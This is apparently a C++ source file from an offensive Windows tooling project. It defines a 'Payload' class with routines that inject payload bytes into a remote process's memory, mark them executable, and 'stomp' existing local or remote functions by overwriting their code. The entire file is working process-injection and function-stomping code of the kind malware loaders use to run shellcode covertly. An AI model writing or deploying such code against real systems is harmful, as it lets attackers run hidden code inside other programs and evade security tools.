#include "PayloadClass.h"

Payload::error_codes Payload::InjectToRemoteProcWriteMem
(
	IN     OPTIONAL HANDLE hTargetProcessHandle
)
{
	LPVOID		lpExtPayloadAddress = nullptr;
	DWORD       dwOldProtection		= NULL;
	SIZE_T	    sBytesWritten		= NULL;
	error_codes ecStatus			= CheckPayloadValidity();

	if (ecStatus != success) return ecStatus;

	if (CheckHandleValidity(hAttachedProcessHandle) != success)
	{
		ecStatus = CheckHandleValidity(hTargetProcessHandle);

		if (ecStatus != success) return ecStatus;

		hAttachedProcessHandle = hTargetProcessHandle;
	}
	
	lpExtPayloadAddress = VirtualAllocEx(hAttachedProcessHandle, nullptr, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (lpExtPayloadAddress == nullptr) return virtualProtectExFailed;
	
	lpExternalAddress = lpExtPayloadAddress;

	if (WriteProcessMemory(hAttachedProcessHandle, lpExtPayloadAddress, pData, sSize, &sBytesWritten) == FALSE || sSize != sBytesWritten) return writeProcMemFailed;

	if (VirtualProtectEx(hAttachedProcessHandle, lpExtPayloadAddress, sSize, PAGE_EXECUTE_READ, &dwOldProtection) == FALSE) return virtualProtectExFailed;

	return ecStatus;
}

Payload::error_codes Payload::StompLocalFunction
(
	IN			LPVOID pTargetFunction 
)
{
	if (pTargetFunction == nullptr) return nullptrInput;

	error_codes ecStatus = CheckPayloadValidity();

	if (ecStatus != success) return  ecStatus;

	if (VirtualProtect(pTargetFunction, sSize, PAGE_READWRITE, &dwProtections) == FALSE) return virtualProtectFailed;

	if (memcpy(pTargetFunction, pData, sSize) == nullptr) return memcpyFailed;

	if (VirtualProtect(pTargetFunction, sSize, dwProtections, &dwProtections) == FALSE) return virtualProtectFailed;

	lpLocalStompedFunction = pTargetFunction;

	return ecStatus;
}

Payload::error_codes Payload::StompRemoteFunction
(
	IN          LPVOID lpRemoteFunctionAddress
)
{
	if (lpRemoteFunctionAddress == nullptr) return nullptrInput;

	SIZE_T		sBytesWritten = NULL;
	error_codes ecStatus	  = CheckPayloadValidity();

	if (ecStatus != success) return ecStatus;

	if (VirtualProtectEx(hAttachedProcessHandle, lpRemoteFunctionAddress, sSize, PAGE_READWRITE, &dwProtections) == FALSE) return virtualProtectExFailed;

	if (WriteProcessMemory(hAttachedProcessHandle, lpRemoteFunctionAddress, pData, sSize, &sBytesWritten) == FALSE || sBytesWritten != sSize) return writeProcMemFailed;

	if (VirtualProtectEx(hAttachedProcessHandle, lpRemoteFunctionAddress, sSize, dwProtections, &dwProtections) == FALSE) return virtualProtectExFailed;

	lpRemoteStompedFunction = lpRemoteFunctionAddress;

	return ecStatus;
}

